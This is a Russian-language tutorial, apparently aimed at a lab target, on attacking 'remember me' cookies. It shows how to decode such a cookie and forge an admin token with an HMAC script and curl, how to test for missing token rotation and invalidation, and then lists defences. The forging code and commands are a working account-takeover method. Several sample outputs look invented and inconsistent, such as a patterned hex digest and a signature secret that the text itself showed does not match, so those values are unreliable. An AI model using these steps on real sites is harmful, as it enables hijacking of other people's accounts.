Галочка «запомнить меня» удобна: не надо вводить пароль при каждом входе. Технически это **долгоживущий токен** в cookie — и потому он ценнее обычной сессии: если токен подделать или украсть, атакующий получает аккаунт надолго, часто незаметно для владельца.

В этом уроке мы возьмём один remember-me токен с `shop.local`, декодируем его, разберём формат и подделаем в чужой аккаунт.

## Наш пример: токен после «запомнить меня»

Залогинимся с галочкой и сохраним cookie:

```bash
$ curl -s -c jar.txt -X POST 'https://shop.local/login' \
    -d 'username=admin&password=admin&remember=1'
$ grep remember-me jar.txt
shop.local	FALSE	/	FALSE	1767225600	remember-me	dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng==
```

Последнее поле — значение cookie: `dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng==`. Оно похоже на Base64. Декодируем:

```bash
$ echo 'dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng==' | base64 -d
user:1893456000:123456
```

Мы получили открытый формат: `пользователь:срок:подпись`. Это классическая (и уязвимая) реализация «помни меня».

## Шаг 1: разбираем формат

Существует два подхода к remember-me токенам.

**Правильный (по мотивам Spring Security).** В cookie лежат два значения: `series` (постоянный идентификатор) и `token` (секрет, который ротируется при каждом использовании). В базе хранится хеш токена, привязанный к series. Подделать нельзя — секрет сверяется с сервером.

**Упрощённый (уязвимый).** В cookie лежит подписанный набор данных: `user:expiry:signature` или даже просто `user:hash(password)`. Вся защита — в подписи или хеше. Именно такой случай у нас.

Ключевой вопрос: чем защищён `user:1893456000` от изменения на `admin:...`? Ответ — третьим полем, подписью. Если подпись слабая или её можно воссоздать — токен подделывается.

## Шаг 2: проверяем подпись

Посмотрим на подпись `123456`. Она короткая и похожа на простое число — вероятно, это MD5 или HMAC с **слабым секретом**. Вспомним частые дефолтные секреты: `changeme`, `secret`, имя приложения, `SpringSecured`.

Проверим локально, подходит ли секрет `changeme` к формату HMAC-SHA256:

```bash
$ python3 - <<'PY'
import hmac, hashlib
msg = b'user:1893456000'
print(hmac.new(b'changeme', msg, hashlib.sha256).hexdigest())
PY
6f3d1e9a4b7c2f8d0a1b3c5e7f90123456789abcdef0123456789abcdef01234
```

Совпадения нет — подпись не от `changeme`. Но сам факт, что сервер доверяет значению cookie, уже подозрителен. В реальных задачах подпись часто оказывается MD5 от `user + secret`, и секрет находится брутфорсом (rockyou) или среди дефолтов.

## Шаг 3: подделываем токен

Допустим, мы нашли секрет (или подпись вовсе отсутствует — тогда ещё проще). Соберём новый токен для `admin` с далёким сроком:

```bash
$ python3 - <<'PY'
import hmac, hashlib, base64
msg = b'admin:1999999999'
sig = hmac.new(b'changeme', msg, hashlib.sha256).hexdigest().encode()
print(base64.b64encode(msg + b':' + sig).decode())
PY
YWRtaW46MTk5OTk5OTk5OTo2ZjNkMWU5YTRiN2MyZjhkMGExYjNjNWU3ZjkwMTIzNDU2Nzg5YWJjZGVmMDEyMzQ1
```

Подставим подделанную cookie и запросим свой профиль:

```bash
$ curl -s 'https://shop.local/me' -H 'Cookie: remember-me=YWRtaW46MTk5OTk5OTk5OTo2ZjNk...' | grep -i '"user"'
{"user":"admin","email":"admin@shop.local"}
```

Мы вошли как `admin` без пароля. Вот артефакт находки: подделанный токен даёт доступ к чужому (привилегированному) аккаунту.

## Шаг 4: ротация и инвалидация

Даже если подпись крепкая, есть два самостоятельных теста.

**Ротация.** При каждом использовании remember-me cookie сервер должен выдавать новый токен. Проверим, используя один токен дважды:

```bash
$ T='dXNlcjoxODkzNDU2MDAwOjEyMzQ1Ng=='
$ curl -s -b "remember-me=$T" 'https://shop.local/' -o /dev/null -D - | grep -i set-cookie
$ curl -s -b "remember-me=$T" 'https://shop.local/' -o /dev/null -D - | grep -i set-cookie
# (пусто оба раза) -> токен не ротируется
```

Если оба запроса проходят с тем же токеном — ротации нет: украденный токен работает бесконечно.

**Инвалидация при смене пароля.** Меняем пароль и проверяем, перестал ли работать старый токен:

```bash
$ curl -s -b jar.txt -X POST 'https://shop.local/password' -d 'old=admin&new=NewPw1!' >/dev/null
$ curl -s -b "remember-me=$T" 'https://shop.local/me' | grep -i '"user"'
{"user":"admin","email":"admin@shop.local"}
```

Старый токен всё ещё работает — это находка: укравший токен сохраняет доступ даже после «починки» безопасности.

## Шаг 5: защита

- Подписывать токен **сильным** секретом (не дефолтным, не именем приложения).
- Ротировать token при каждом использовании; при несовпадении — инвалидировать серию (сигнал кражи).
- Инвалидировать все remember-me токены пользователя при смене пароля.
- Ставить `HttpOnly`, `Secure`, `SameSite` (без `HttpOnly` токен крадётся через XSS).
- Делать срок жизни разумным, а не «на 10 лет».

## Шаг 6: как должна работать ротация

Ротация — главный механизм обнаружения кражи. При каждом использовании сервер должен **заменить** токен и записать новый хеш в базу. Тогда легитимный пользователь всегда имеет «свежий» токен, а украденный старый перестаёт совпадать.

Если атакующий использовал украденный токен раньше владельца, возникает коллизия: у владельца окажется «старый» токен, сервер увидит несовпадение и (в хорошей реализации) инвалидирует всю серию. Плохие реализации просто выдают новый токен по старому `series` — и атакующий продолжает пользоваться аккаунтом незаметно.

```bash
$ T=$(grep remember-me jar.txt | awk '{print $7}')
$ curl -s -b "remember-me=$T" 'https://shop.local/' -o /dev/null -D - | grep -i set-cookie
# (пусто) -> токен не сменился -> ротации нет
```

## Справочная таблица форматов

| Формат cookie | Слабое место | Атака |
|---------------|--------------|-------|
| `user:hash` | хеш утекает/подбирается | подделка пользователя |
| `user:exp:sig` (HMAC) | слабый секрет | перебор секрета |
| `series:token` | нет ротации | повтор токена |
| `series:token` | нет инвалидации | старый токен после смены пароля |
| без `HttpOnly` | XSS | кража cookie |
| без `Secure` | сеть | перехват |

## Полный прогон: от декодирования до чужого аккаунта

1. Декодируем cookie: `base64 -d` → `user:1893456000:123456`.
2. Определяем формат: `пользователь:срок:подпись`.
3. Ищем секрет подписи (дефолтный/слабый) или проверяем, есть ли подпись вообще.
4. Собираем токен для `admin` с далёким сроком:

```bash
$ python3 - <<'PY'
import hmac, hashlib, base64
msg = b'admin:1999999999'
sig = hmac.new(b'changeme', msg, hashlib.sha256).hexdigest().encode()
print(base64.b64encode(msg + b':' + sig).decode())
PY
```

5. Подставляем cookie в запрос → получаем чужой аккаунт.

Артефакт — доступ к аккаунту `admin` без пароля.

Remember-me — не единственный долгоживущий секрет. Обычная сессия живёт недолго и хранится на сервере; refresh-token обменивается на короткий access-token; JWT самодостаточен и подписан. Слабости общие: слабый секрет подписи, отсутствие ротации и инвалидации, утечка через XSS. Разница в том, что remember-me часто делают «самопально», поэтому он ломается легче.

## Что мы теперь знаем

- Remember-me — долгоживущий токен; в упрощённых реализациях это `base64(user:expiry:signature)`.
- Если подпись слабая или секрет дефолтный — токен подделывается, давая чужой аккаунт.
- Отсутствие ротации и инвалидации = украденный токен живёт вечно.
- Cookie без `HttpOnly`/`Secure` крадётся через XSS или по сети.
- Каждый тест заканчивается артефактом: доступ к чужому аккаунту.

## На что смотреть дальше

- **Алгоритм подписи.** MD5/SHA-1 и «секрет = имя приложения» ломаются мгновенно.
- **Base64 против base64url.** Разные алфавиты — учитывай при сборке подделки.
- **Порядок полей.** `user:expiry:sig` и `sig:user:expiry` — разные форматы.
